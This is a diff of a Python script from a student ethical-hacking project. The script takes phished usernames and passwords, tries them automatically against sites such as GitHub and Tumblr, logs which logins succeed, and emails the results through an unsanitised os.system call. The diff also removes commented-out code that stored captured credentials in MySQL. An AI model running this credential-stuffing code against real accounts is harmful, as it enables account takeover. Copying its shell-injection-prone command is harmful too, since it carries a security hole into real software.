@@ -14,15 +14,6 @@ import json
 import pymysql.cursors
 import pymysql
 import os
-"""
-# Connect to the database
-connection = pymysql.connect(host='localhost',
-                             user='root',
-                             password='ethicalhacking',
-                             db='ethicalhackingteam2',
-                             charset='utf8mb4',
-                             cursorclass=pymysql.cursors.DictCursor)
-"""
 
 # enum for the sites
 class Site(str, Enum):
@@ -67,7 +58,8 @@ browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv
 browser.set_handle_refresh(False)
 
 f = open('/var/www/html/EthicalHackingTeam2/results/results.txt', 'w')
-f.write("Based on your credentials, we were able to access: \n")
+f.write("Oh no! You've been phished! \n")
+f.write("Based on your credentials, we were able to access: \n\n\n")
 def main():
 
     # fb #need to use nr = 0 (email, pass)
@@ -81,26 +73,14 @@ def main():
         username = sys.argv[1]
         password = sys.argv[2]
 
-	"""                 
-        # Update MySql database
-        with connection.cursor() as cursor:
-            # Create a new record
-            print("<p>Adding entry</p>")
-            sql = "INSERT INTO `ethicalhackingteam2` (`username`, `password`) VALUES (%s, %s)"
-            cursor.execute(sql, (username, password))
-
-        # connection is not autocommit by default. So you must commit to save
-        # your changes.
-        connection.commit()
-	"""
-
-
         # Authenticate to each site
         for site in sys.argv[3:]:
             print("<p><u>Attempt: <strong>" + site + "</strong></u></p>")
             f.write("Attempt: " + site)
             # Attempt authentication
             attempt_authentication(site=site, username=username, password=password)
+	    f.write("\n")
+	f.write("\n\n -CS378 Ethical Hacking Team 2- \n\n if you want to learn more about securing your password, visit: https://staysafeonline.org/stay-safe-online/securing-key-accounts-devices/passwords-securing-accounts/")
 	f.close()	
 	#lets run that emailer
 	os.system('python /var/www/html/EthicalHackingTeam2/Email/emailResults.py '+ username + " " + '/var/www/html/EthicalHackingTeam2/results/results.txt')
@@ -128,6 +108,7 @@ def attempt_authentication(site, username, password):
             browser.form['login'] = username
             browser.form['password'] = password
         if site == Site.Github:
+	    browser.select_form(nr=1)
             browser.form['login'] = username
             browser.form['password'] = password
         if site == Site.Tumblr:
@@ -152,25 +133,12 @@ def attempt_authentication(site, username, password):
 	
         if success:
             print("<p style=color:green;>Success</p>")
-	    f.write("---> Success \n")
+	    f.write("---> Success")
            # print("<p>Updating database...</p>")
-	    """
-            # Update MySql database
-            with connection.cursor() as cursor:
-                sql = "UPDATE ethicalhackingteam2 SET sites_breached_%s" % site
-                sql = sql + "=1"
-                sql = sql + " WHERE username='" + username + "'"
-                cursor.execute(sql)
-                print("<p>Updated</p>")
 
-            # # connection is not autocommit by default. So you must commit to save
-            # # your changes.
-            connection.commit()
-	    """         
         else:
             print("<p style=color:red;>Failed</p>")     
-	    f.write("---> Failed \n")  
-
+	    f.write("---> Failed")  
 
 
 
